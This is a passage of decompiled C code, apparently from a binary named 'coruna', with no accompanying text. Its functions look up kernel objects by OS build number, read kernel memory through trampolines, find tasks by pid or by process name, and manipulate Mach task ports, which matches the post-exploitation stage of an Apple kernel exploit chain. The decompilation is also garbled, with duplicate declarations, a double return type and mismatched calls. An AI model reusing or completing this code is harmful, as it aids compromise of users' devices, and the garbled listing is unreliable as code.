    _bzero(ctx,(unsigned long)(u >> 0x10 | u << 0x10));
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(ctx);
  return;
}





uint64_t
void coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_6(uint64_t val,uint64_t id_2,unsigned long arg,uint64_t size_3,
            uint64_t off_4)
{
  uint64_t u;
  long scratch;
  
  u = coruna_kernel29bb0_trampoline_0001a670(val,id_2,&scratch);
  if ((int)u != 0) {
    do {
      u = coruna_call_mach_vm_machine_attribute_29df8_1acd4(val,scratch + (arg & 0xffffffff),size_3,off_4);
      if ((int)u == 0) {
        return u;
      }
      u = coruna_kernel29bb0_trampoline_0001a670(val,scratch,&scratch);
      if ((int)u == 0) {
        return u;
      }
    } while (scratch != 0);
    u = 1;
  }
  return u;
}





void coruna_kernel29bb0_via_mach_port_allocate_2248c(long handle,uint *size)
{
  uint u;
  uint size;
  int err;
  uint version;
  void (*ptr)(void);
  int status;
  long handle;
  unsigned long unaff_x30;
  
  status = coruna_ctx_test_flag(handle,0x5184001);
  if (status != 0) {
    u = *size;
    if (0x1ff8 < u) {
      size = *(uint *)(handle + 0x180);
      version = 0;
      if (size != 0) {
        version = u / size;
      }
      err = u - version * size;
      status = 0;
      if (err != 0) {
        status = size - err;
      }
      handle = coruna_mach_port_destroy(handle,status + u);
      if (handle != 0) {
        *size = status + u;
      }
      return;
    }
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_mach_port_allocate_2248c(handle,size);
  return;
}





void coruna_kernel09_via_bzero_2(uint *size)
{
  void (*ptr)(void);
  unsigned long u;
  long handle;
  unsigned long unaff_x30;
  
  if (*size != 0) {
    u = 0;
    handle = 8;
    do {
      coruna_bzero(*(uint64_t *)(*(long *)(size + 2) + handle));
      u = u + 1;
      handle = handle + 0x10;
    } while (u < *size);
  }
  _free(*(void **)(size + 2));
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(size);
  return;
}





uint coruna_iokit_msg_append(uint *size,uint32_t size_x,uint64_t val)
{
  uint32_t *ptr;
  void *ptr;
  uint u;
  
  u = *size;
  if (u < size[1]) {
    ptr = *(void **)(size + 2);
  }
  else {
    u = size[1] << 1;
    ptr = _realloc(*(void **)(size + 2),(unsigned long)u << 4);
    if (ptr == (void *)0x0) {
      return 0xffffffff;
    }
    size[1] = u;
    *(void **)(size + 2) = ptr;
    u = *size;
  }
  ptr = (uint32_t *)((long)ptr + (unsigned long)u * 0x10);
  *ptr = size_x;
  *(uint64_t *)(ptr + 2) = val;
  *size = u + 1;
  return u + 1;
}





uint64_t * coruna_malloc(void)
{
  uint64_t *ptr;
  void *ptr;
  
  ptr = _malloc(0x10);
  if (ptr != (uint64_t *)0x0) {
    ptr = _malloc(0x40);
    if (ptr == (void *)0x0) {
      _free(ptr);
      ptr = (uint64_t *)0x0;
    }
    else {
      ptr[1] = ptr;
      *ptr = k_kernel_rodata_word_2af18;
    }
  }
  return ptr;
}





long coruna_return_zero_2af7c(long handle,long addr_2)
{
  int err;
  bool err;
  long handle;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      handle = 0x68;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x58;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x48;
  }
  return handle + addr_2;
}





long coruna_return_zero_1f078(long handle,uint64_t val)
{
  int err;
  long handle;
  uint8_t scratch;
  byte scratch;
  long bootargs;
  
  err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,val,&scratch);
  if (err != 0) {
    handle = coruna_return_zero_2af7c(handle,val);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle,&bootargs);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(handle,bootargs);
      if (handle == 0) {
        return 0;
      }
      if ((*(unsigned long *)(handle + 0x158) < 0x1f530000000000) && ((scratch >> 2 & 1) != 0)) {
        err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + *(int *)(handle + 0x168),&bootargs);
        if (err == 0) {
          return 0;
        }
        handle = coruna_ptr_canonicalize(handle,bootargs);
        if (handle == 0) {
          return 0;
        }
      }
      return bootargs;
    }
  }
  return 0;
}





long coruna_return_zero_2b0c0(long handle,long addr_2)
{
  int err;
  bool err;
  int status;
  long handle;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      handle = 0x90;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        handle = 0x98;
      }
    }
    else if (err == 0x1c1b) {
      handle = 0x90;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x80;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x70;
  }
  return handle + addr_2;
}





long coruna_return_zero_2b0c0_1f1e4(long handle,long addr_2)
{
  int err;
  bool err;
  int status;
  long handle;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      handle = 0xa0;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        handle = 0xa8;
      }
    }
    else if (err == 0x1c1b) {
      handle = 0xa0;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x90;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x80;
  }
  return handle + addr_2;
}





mach_port_t coruna_processor_set_info(long handle)
{
  void (*ptr)(void);
  uid_t u;
  mach_port_t lm3;
  kern_return_t lk4;
  unsigned long unaff_x30;
  mach_msg_type_number_t scratch;
  integer_t bootargs [2];
  host_t thread_attr;
  processor_set_name_t host_info;
  
  thread_attr = 0;
  scratch = 2;
  if ((*(char *)(handle + 10) != '\0') && (u = _getuid(), u != 0)) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      lm3 = _mach_host_self();
      return lm3;
    }
    ___stack_chk_fail();
}
  lm3 = _mach_host_self();
  lk4 = _processor_set_default(lm3,&host_info);
  if (lk4 == 0) {
    lk4 = _processor_set_info(host_info,5,&thread_attr,bootargs,&scratch);
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
  }
  if (lk4 == 0x35) {
    thread_attr = _mach_host_self();
  }
  return thread_attr;
}





int coruna_return_zero_2b2d0(long handle)
{
  bool err;
  int err;
  int status;
  
  err = *(int *)(handle + 0x174);
  if (err == 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f54) {
      if (err == 0x1809) {
        err = 0xa8;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          err = 0xb0;
        }
      }
      else if (err == 0x1c1b) {
        err = 0xa8;
      }
      else {
        if (err != 0x1f53) {
          return 0;
        }
        err = 0xa0;
      }
    }
    else {
      if (err < 0x225c) {
        err = err == 0x1f54;
        status = 0x2258;
      }
      else {
        err = err == 0x225c;
        status = 0x2712;
      }
      if (!err && err != status) {
        return 0;
      }
      err = 0x90;
    }
    *(int *)(handle + 0x174) = err;
  }
  return err;
}





void coruna_kernel29bb0_via_return_zero_1f078(long handle,uint64_t val)
{
  int err;
  void (*ptr)(void);
  long handle;
  int status;
  unsigned long unaff_x30;
  
  err = *(int *)k_kernel_mach_task_self_slot;
  status = (int)val;
  if ((err != status) || (*(long *)(handle + 0x1b0) == 0)) {
    if (status == -1) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078(handle);
      return;
    }
    handle = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7(handle,err,val);
    if (((handle != 0) && (handle = coruna_return_zero_1f078(handle,handle), err == status && handle != 0)) &&
       (*(long *)(handle + 0x1b0) == 0)) {
      *(long *)(handle + 0x1b0) = handle;
    }
  }
  return;
}





long coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078(long handle)
{
  long handle;
  
  handle = *(long *)(&k_kernel_slot_19d8 + handle);
  if (handle == 0) {
    if (*(int *)(&k_kernel_slot_191c + handle) != -1) {
      if (*(int *)(&k_kernel_slot_191c + handle) != 0) {
fail:
        handle = coruna_kernel29bb0_via_return_zero_1f078();
        return handle;
      }
      handle = coruna_kernel29bb0_via_return_zero_1f078();
      return handle;
    }
    handle = 0;
  }
  return handle;
}





void coruna_ret_stub_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}





uint64_t coruna_return_zero_1f4f0(long handle,long addr_2)
{
  bool err;
  bool status;
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
      handle = 0x308;
    }
    else {
      if (err == 0x1809) {
        handle = 800;
        err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + addr_2,&scratch);
        if (err == 0) {
        u = 0;
        }
        else {
        handle = coruna_ptr_canonicalize(handle,scratch);
        u = 0;
        if (handle != 0) {
        u = scratch;
        }
        }
        return u;
      }
      if (err != 0x1c1b) {
        return 0;
      }
      err = 0x1c1b19145ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1c1b19145fffff;
      handle = 0x338;
    }
    if (!err || status) {
      handle = 0x330;
    }
  }
  else {
    if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
      return 0;
    }
    handle = 0x300;
  }
fail:
  err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + addr_2,&scratch);
  if (err == 0) {
    u = 0;
  }
  else {
    handle = coruna_ptr_canonicalize(handle,scratch);
    u = 0;
    if (handle != 0) {
      u = scratch;
    }
  }
  return u;
}





uint32_t coruna_iosurface_field_read(long handle)
{
  int err;
  uint32_t u;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      u = 0x2c0;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2e8;
      }
      return u;
    }
    if (err == 0x1809) {
      return 0x2d0;
    }
    if (err == 0x1c1b) {
      return 0x2e0;
    }
  }
  else if ((err == 0x2258 || err == 0x225c) || err == 0x2712) {
    u = 0x2b8;
  }
  return u;
}





uint32_t coruna_return_zero_2b624(long handle)
{
  bool err;
  bool status;
  int err;
  uint32_t u;
  uint32_t size;
  unsigned long version;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        err = coruna_ctx_test_flag(handle,0x5584001);
        if (err == 0) {
          return 0x380;
        }
        return 0x388;
      }
      if (err != 0x1c1b) {
        return 0;
      }
      version = *(unsigned long *)(handle + 0x158);
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x390;
      if (err != 0) {
        u = 0x3a0;
      }
      size = 0x398;
      if (err != 0) {
        size = 0x3b0;
      }
      if (version < 0x1c1b1914600000) {
        return u;
      }
      return size;
    }
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x378;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x3a0;
      }
      size = 0x390;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x3b8;
      }
      if (err == 0) {
        return u;
      }
      return size;
    }
    err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
    status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
    size = 0x3c8;
    u = 0x3a0;
  }
  else {
    if (err != 0x2258) {
      if (err != 0x225c && err != 0x2712) {
        return 0;
      }
      return 0x730;
    }
    err = 0x22580f032ffffe < *(unsigned long *)(handle + 0x158);
    status = *(unsigned long *)(handle + 0x158) == 0x22580f032fffff;
    size = 0x530;
    u = 0x538;
  }
  if (!err || status) {
    u = size;
  }
  return u;
}





int coruna_return_zero_2b7a0(long handle)
{
  int err;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (err - 0x1f53U < 2) {
      if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
        err = coruna_return_zero_2b624(handle);
        return err + 8;
      }
      return 0;
    }
    if (err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x225c && err != 0x2712) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x5100000);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5584001);
    status = 0x370;
    if (err != 0) {
      status = 0x388;
    }
  }
  else {
    status = 0x3a0;
  }
  return status;
}





long coruna_return_zero_201ac(long handle,uint64_t val)
{
  int err;
  uint u;
  long handle;
  long addr;
  
  if (*(int *)(handle + 0x140) < 0x2258) {
    u = coruna_return_zero_2b624();
    if (u == 0) {
      return 0;
    }
  }
  else {
    err = coruna_return_zero_2b7a0();
    if (err == 0) {
      return 0;
    }
    u = err - *(int *)(handle + 0x168);
  }
  handle = coruna_kernel29bb0_via_return_zero_1f078(handle,val);
  addr = 0;
  if (handle != 0) {
    addr = handle + (unsigned long)u + (long)*(int *)(handle + 0x168);
  }
  return addr;
}





long coruna_return_zero_1f958(long handle,long addr_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_return_zero_2b624();
  if (u != 0) {
    if (0x2257 < *(int *)(handle + 0x140)) {
      return addr_2 - (unsigned long)u;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,(unsigned long)u + addr_2,&scratch);
    if ((err != 0) && (scratch != 0)) {
      handle = coruna_ptr_canonicalize(handle);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





uint32_t coruna_return_zero_2ba94(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  u = 0x28;
  if (err < 0x2258) {
    if (1 < err - 0x1f53U && err != 0x1809) {
      if (err != 0x1c1b) {
        return 0;
      }
      u = 0x20;
      if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
        u = 0x28;
      }
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0;
  }
  return u;
}





void coruna_call_mach_vm_machine_attribute_29df8_1fa68(void)
{
  coruna_macho_data_seg_1fa70();
  return;
}





void coruna_macho_data_seg_1fa70(long handle,unsigned long arg,int flags,char *path)
{
  int err;
  unsigned long u;
  int status;
  int flags;
  unsigned long size;
  long handle;
  long addr;
  long off;
  unsigned long version;
  long base;
  int count;
  int scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info;
  long serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  status = *(int *)(handle + 0x140);
  size = 0;
  if (path == (char *)0x0) {
    if (status < 0x2258) {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
  else if (status == 0x2258) {
    off = 0x381;
    addr = 0;
  }
  else {
    if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(size);
  }
  status = coruna_return_zero_2ba94(handle);
  if (status == 0) {
done:
    size = 0;
  }
  else {
    err = *(int *)(handle + 0x168);
    if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
      serial_buf = 0;
      version = 0;
      base = 0;
    }
    else {
      coruna_macho_find_loadcmd(&thread_attr,*(long *)(&k_kernel_slot_19f8 + handle),"__DATA");
      size = 0;
      if ((host_info == 0) || (version = host_info, base = thread_attr, serial_buf == 0))
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    count = 0;
    u = arg;
cleanup:
    do {
      bootargs = u;
      handle = coruna_return_zero_1f958(handle,bootargs);
      if (handle != 0) {
        if (path == (char *)0x0) {
          flags = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + addr,4,&scratch);
          if (flags == 0) { size = 0; break; }
          size = bootargs;
          if (scratch == flags) break;
        }
        else {
          flags = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + off,0x21,&thread_attr);
          if (flags == 0) { size = 0; break; }
          flags = _strncmp((char *)&thread_attr,path,0x21);
          size = bootargs;
          if (flags == 0) break;
        }
      }
      flags = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + (uint)(err + status),&bootargs);
      if (flags == 0) { size = 0; break; }
      bootargs = coruna_ptr_canonicalize(handle,bootargs);
      if (bootargs != 0) {
        if (((base != 0) && (version <= bootargs)) && (bootargs < version + serial_buf)) {
          flags = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs,&bootargs);
          if (flags == 0) { size = 0; break; }
          bootargs = coruna_ptr_canonicalize(handle,bootargs);
          if (bootargs == 0) goto check_ok;
        }
        u = bootargs;
        if (bootargs != arg) continue;
      }
check_ok:
      coruna_semaphore_timedwait(handle,250000);
      size = 0;
      count = count + 1;
      u = arg;
    } while (count != 6);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(size);
}





void coruna_call_macho_data_seg_2bb24_2bdb4(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_macho_data_seg_1fa70(val,id_2,0,size_3);
  return;
}





long coruna_return_zero_1fd0c(long handle,long addr_2,uint32_t *size,uint32_t *flags_2)
{
  int err;
  long handle;
  long scratch;
  uint32_t bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
      handle = 0x14;
      err = coruna_kernel29bb0_trampoline_0001a670(handle,addr_2 + 0x20,&scratch);
      if ((err != 0) && (scratch != 0)) {
      scratch = coruna_ptr_canonicalize(handle);
      if (scratch == 0) {
      return 0;
      }
      if (0x1f01 < *(int *)(handle + 0x140)) {
      addr_2 = scratch;
      }
      err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr_2 + handle,&bootargs);
      if (err != 0) {
      *size = bootargs;
      *flags_2 = 0x18;
      return scratch;
      }
      }
      return 0;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return 0;
  }
  handle = 8;
fail:
  err = coruna_kernel29bb0_trampoline_0001a670(handle,addr_2 + 0x20,&scratch);
  if ((err != 0) && (scratch != 0)) {
    scratch = coruna_ptr_canonicalize(handle);
    if (scratch == 0) {
      return 0;
    }
    if (0x1f01 < *(int *)(handle + 0x140)) {
      addr_2 = scratch;
    }
    err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr_2 + handle,&bootargs);
    if (err != 0) {
      *size = bootargs;
      *flags_2 = 0x18;
      return scratch;
    }
  }
  return 0;
}





uint64_t coruna_pid_for_task(long handle,mach_port_name_t arg,uint64_t val,uint64_t id_2)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  uint64_t u;
  long handle;
  long addr;
  mach_port_t scratch;
  int bootargs;
  uint32_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  if ((*(mach_port_name_t *)k_kernel_mach_task_self_slot == arg) &&
     (handle = *(long *)(handle + 0x1a0), handle != 0)) {
    u = coruna_return_zero_1fd0c(handle,handle,val,id_2);
  }
  else {
    u = 0;
    if ((*(long *)(&k_kernel_slot_19d0 + handle) != 0) && (handle = coruna_return_zero_1f078(handle), handle != 0)) {
      if (*(task_t *)(&k_kernel_slot_1918 + handle) + 1 < 2) {
        bootargs = 0;
        lk2 = _pid_for_task(arg,&bootargs);
        if ((lk2 == 0) && (handle = coruna_macho_data_seg_1fa70(handle,handle,bootargs,0), handle != 0)) {
          handle = coruna_return_zero_1f4f0(handle,handle);
          if (handle != 0) {
            if (*(mach_port_name_t *)ptr == arg) {
              *(long *)(handle + 0x1a0) = handle;
            }
            u = coruna_return_zero_1fd0c(handle,handle,val,id_2);
          }
        }
      }
      else {
        scratch = arg;
        lk2 = _mach_ports_register(*(task_t *)(&k_kernel_slot_1918 + handle),&scratch,1);
        if (lk2 == 0) {
          if (*(int *)(handle + 0x140) == 0x1809) {
            addr = 0x308;
          }
          else if (*(int *)(handle + 0x140) == 0x1c1b) {
            addr = 0x318;
          }
          else {
            addr = 0;
          }
          if (addr != 0) {
            err = coruna_kernel29bb0_trampoline_0001a670(handle,addr + handle,&bootargs);
            if (((err != 0) &&
                (handle = coruna_ptr_canonicalize(handle,coruna_u64_pack((scratch), (bootargs))), handle != 0)) &&
               (handle = coruna_return_zero_1f078(handle,handle), handle != 0)) {
              scratch = 0;
              lk2 = _mach_ports_register(*(task_t *)(&k_kernel_slot_1918 + handle),&scratch,1);
              if (lk2 == 0) {
                handle = coruna_return_zero_1f4f0(handle,handle);
                if (handle != 0) {
                  if (*(mach_port_name_t *)ptr == arg) {
                    *(long *)(handle + 0x1a0) = handle;
                  }
                  u = coruna_return_zero_1fd0c(handle,handle,val,id_2);
                }
              }
            }
          }
        }
      }
    }
  }
  return u;
}
long coruna_return_zero_2c0bc(uint64_t val,uint64_t id_2,uint size)
{
  long handle;
  int scratch;
  uint bootargs;
  
  if (1 < size + 1) {
    handle = coruna_pid_for_task(val,id_2,&bootargs,&scratch);
    if (handle == 0) {
      return 0;
    }
    if (size >> 8 < bootargs) {
      return handle + (unsigned long)(scratch * (size >> 8));
    }
  }
  return 0;
}





void coruna_call_return_zero_2c0bc(uint64_t val,uint64_t id_2)
{
  coruna_return_zero_2c0bc(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7(uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  
  handle = coruna_return_zero_2c0bc();
  u = 0;
  if (handle != 0) {
    err = coruna_kernel29bb0_trampoline_0001a670(val,handle,&scratch);
    if (err == 0) {
      u = 0;
    }
    else {
      u = coruna_ptr_canonicalize(val,scratch);
    }
  }
  return u;
}





long coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_8(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  long off;
  long base;
  uint u;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  
  addr = coruna_return_zero_2019c();
  base = 0;
  if (addr != 0) {
    u = 0;
    do {
      err = false;
      err = coruna_kernel29bb0_trampoline_0001a670(val,addr + 0x38,&thread_attr);
      handle = thread_attr;
      status = err;
joined_r0x000200d8:
      thread_attr = handle;
      if ((((status == 0) || (handle == 0)) || (off = coruna_ptr_canonicalize(val,handle), off == 0)) ||
         (status = coruna_kernel29bb0_trampoline_0001a670(val,handle + -0x10,&bootargs), status == 0))
      goto joined_r0x00020178;
      off = thread_attr;
      if (arg < bootargs) {
fail:
        status = coruna_kernel29bb0_trampoline_0001a670(val,off,&thread_attr);
        handle = thread_attr;
        goto joined_r0x000200d8;
      }
      status = coruna_kernel29bb0_trampoline_0001a670(val,handle + -8,&scratch);
      if (status == 0) goto joined_r0x00020178;
      if (scratch <= arg) {
        off = thread_attr + 8;
        goto fail;
      }
      base = handle + -0x20;
      err = true;
joined_r0x00020178:
    } while (((err != 0) && (!err)) && (err = u < 5, u = u + 1, err));
  }
  return base;
}





long coruna_return_zero_2019c(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_return_zero_2ba94();
  if (u != 0) {
    scratch = coruna_kernel29bb0_via_return_zero_1f078(val,id_2);
    if (scratch == 0) {
      return 0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(val,scratch + (unsigned long)u,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





uint64_t coruna_return_zero_20224(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  void (*ptr)(void);
  unsigned long u;
  uint64_t size;
  unsigned long version;
  unsigned long unaff_x30;
  
  u = coruna_vm_page_info(val,id_2,size_3);
  if (u == 0) {
    return 0;
  }
  if ((u & 1) == 0) {
    if (*(long *)(&k_kernel_slot_19e0 + handle) == 0) {
      return 0;
    }
    version = *(long *)(&k_kernel_slot_19e0 + handle) + u;
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
    }
    size = coruna_ptr_canonicalize(handle,version);
    return size;
  }
  else {
    version = u - *(long *)(handle + 0x138);
    if (u >> 0x20 == 0) {
      version = version & 0xffffffff;
    }
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
    }
    size = coruna_ptr_canonicalize(handle,version);
    return size;
  }
  version = u | version;
fail:
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  size = coruna_ptr_canonicalize(handle,version);
  return size;
}





void coruna_helper_17db8_202d0(uint64_t val)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel29bb0_via_return_zero_1f078();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_1f958(val,handle);
  return;
}





long coruna_return_zero_20d3c(long handle)
{
  int err;
  long handle;
  long addr;
  
  handle = coruna_return_zero_1f958();
  addr = 0;
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        addr = 0x20;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0xd8;
        }
      }
      else if (err == 0x1809) {
        addr = 0x100;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0xf0;
      }
    }
    else {
      if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
        return 0;
      }
      addr = 0x20;
    }
    addr = addr + handle;
  }
  return addr;
}





void coruna_helper_17db8_203dc(uint64_t val)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel29bb0_via_return_zero_1f078();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_20d3c(val,handle);
  return;
}





uint64_t coruna_return_zero_20428(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  long handle;
  long addr;
  uint64_t scratch;
  uint64_t bootargs;
  
  handle = coruna_return_zero_20d3c();
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel29bb0_trampoline_0001a670(val,handle,&bootargs);
  if (err != 0) {
    addr = coruna_ptr_canonicalize(val,bootargs);
    if (addr == 0) {
      return 0;
    }
    if (size_3 == (uint64_t *)0x0) {
      return bootargs;
    }
    err = coruna_kernel29bb0_via_ioconnectcallmethod_2(val,handle,&scratch);
    if (err != 0) {
      *size_3 = scratch;
      return bootargs;
    }
  }
  return 0;
}





void coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel29bb0_via_return_zero_1f078();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_20428(val,handle,size_3);
  return;
}





uint64_t coruna_return_zero_2050c(long handle)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  uint64_t scratch;
  
  handle = coruna_kernel29bb0_via_return_zero_1f078();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2 || err == 0x1c1b) {
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      err = coruna_ctx_test_flag(handle,0x5584201);
      err = err == 0;
      addr = 0x418;
      off = 0x460;
    }
    else {
      err = coruna_ctx_test_flag(handle,0x100000);
      if (err != 0) {
        off = 0x4f0;
        err = coruna_kernel29bb0_trampoline_0001a670(handle,off + handle,&scratch);
        if (err == 0) {
        return 0;
        }
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err != 0) {
        off = 0x4e8;
        err = coruna_kernel29bb0_trampoline_0001a670(handle,off + handle,&scratch);
        if (err == 0) {
        return 0;
        }
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,1);
      if (err != 0) {
        off = 0x4e0;
        err = coruna_kernel29bb0_trampoline_0001a670(handle,off + handle,&scratch);
        if (err == 0) {
        return 0;
        }
